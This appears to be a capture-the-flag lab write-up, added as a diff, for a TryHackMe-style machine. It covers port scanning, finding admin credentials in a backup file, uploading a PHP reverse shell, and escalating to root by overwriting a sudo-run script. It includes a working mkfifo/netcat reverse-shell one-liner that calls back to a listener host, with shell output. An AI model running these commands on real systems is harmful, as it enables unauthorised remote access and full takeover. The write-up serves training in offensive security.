@@ -1,0 +1,76 @@
+-------------------------------------------------------------------------------------------------------------------------------------
+
+note:-
+
+🔍 Command Breakdown:
+
+rm /tmp/f
+Deletes /tmp/f if it already exists.
+
+mkfifo /tmp/f
+Creates a named pipe (FIFO) at /tmp/f.
+
+cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.7.140 6667 > /tmp/f
+    cat /tmp/f reads commands from the FIFO.
+    /bin/sh -i runs an interactive shell.
+    2>&1 redirects stderr to stdout.
+    nc 10.17.7.140 6667 connects to the attacker's machine and sends shell output.
+    > /tmp/f writes Netcat's input back into the named pipe, completing the loop.
+    
+-------------------------------------------------------------------------------------------------------------------------------------
+
+step 1:- first we scan the target and find open ports
+
+cmd:-
+nmap -v ip
+nmap -sV -sC -p[ports] -v ip
+
+here is to port open ssh, http
+
+here we need to find path from go inside in server
+
+step 2:- using dirsearch,gobuster, ffuf we find directories and sub directorie of target url.
+here we analysis each and we find server backup file that cover admin privileges in my sql backup file, using those credential i enter the target website and become admin
+
+step 3:- after i want access server shell show i import revershell.php file in the server than click on the file.
+
+step 4:-i uses nc for my communication to server shell to me
+
+cmd:-nc -lvnp [port]
+
+step 5:- after this i gained server shell but here i just gained user privileges so i want gain root priviledges that makes me more powerfull.
+
+cmd:-sudo -l
+ans:-Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+    
+    
+cmd:- cat /home/itguy/backup.pl
+ans:-#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+cmd:-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.140 6667 > /tmp/f" > /etc/copy.sh
+     cat /etc/copy.sh
+ans:-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.140 6667 > /tmp/f
+
+than i go to the new terminal and
+cmd:-nc -lvnp 6667
+ans:-listening on [any] 6667 ...
+connect to [10.17.7.140] from (UNKNOWN) [10.10.55.201] 39962
+/bin/sh: 0: can't access tty; job control turned off
+#
+
+cmd:- sudo -l
+ans:-Matching Defaults entries for root on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on THM-Chal:
+    (ALL : ALL) ALL
+    
+    
+here show the i escalate root privilages.
+
